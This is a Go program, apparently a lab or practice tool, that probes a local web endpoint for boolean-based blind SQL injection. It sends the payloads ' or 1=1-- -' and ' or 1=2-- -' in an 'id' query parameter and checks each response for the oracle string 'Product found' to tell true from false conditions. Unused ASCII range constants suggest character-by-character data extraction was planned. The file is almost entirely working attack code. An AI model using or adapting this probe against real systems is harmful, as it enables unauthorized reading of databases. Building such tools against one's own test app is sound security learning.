package main

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	ASCIIMin = 32
	ASCIIMax = 126
)

type HTTPClient struct {
	BaseURL string
	Client  *http.Client
	Timeout time.Duration
}

type Observation struct {
	StatusCode int
	Status     string
	Body       string
	BodyLen    int
}

func NewHTTPClient(baseURL string, timeOut time.Duration) (HTTPClient, error) {
	if timeOut <= 0 {
		return HTTPClient{}, errors.New("timeout must be positive")
	}

	baseURL = strings.TrimRight(baseURL, "/")

	client := http.Client{
		Timeout: timeOut,
	}

	return HTTPClient{
		BaseURL: baseURL,
		Client:  &client,
		Timeout: timeOut,
	}, nil
}

func bodyContainsOracle(obs Observation) bool {
	return strings.Contains(obs.Body, "Product found")
}

func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
	data := url.Values{}
	data.Set("id", payload)

	targetURL := c.BaseURL + "?" + data.Encode()

	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
	if err != nil {
		return Observation{}, fmt.Errorf("create new request %w", err)
	}

	resp, err := c.Client.Do(req)
	if err != nil {
		return Observation{}, fmt.Errorf("http client new do request %w", err)
	}

	defer resp.Body.Close()

	limitedReader := io.LimitReader(resp.Body, 1024*1024)
	body, err := io.ReadAll(limitedReader)
	if err != nil {
		return Observation{}, fmt.Errorf("read body %w", err)
	}

	return Observation{
		Status:     resp.Status,
		StatusCode: resp.StatusCode,
		Body:       string(body),
		BodyLen:    len(body),
	}, nil
}

func main() {
	baseURL := "http://127.0.0.1:5007/boolean"
	client, err := NewHTTPClient(baseURL, 5*time.Second)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	obs, err := client.SendPayload(" ' or 1=1-- -")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Println("Contains oracle:", bodyContainsOracle(obs))

	obs, err = client.SendPayload(" ' or 1=2-- -")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Println("Contains oracle:", bodyContainsOracle(obs))
}
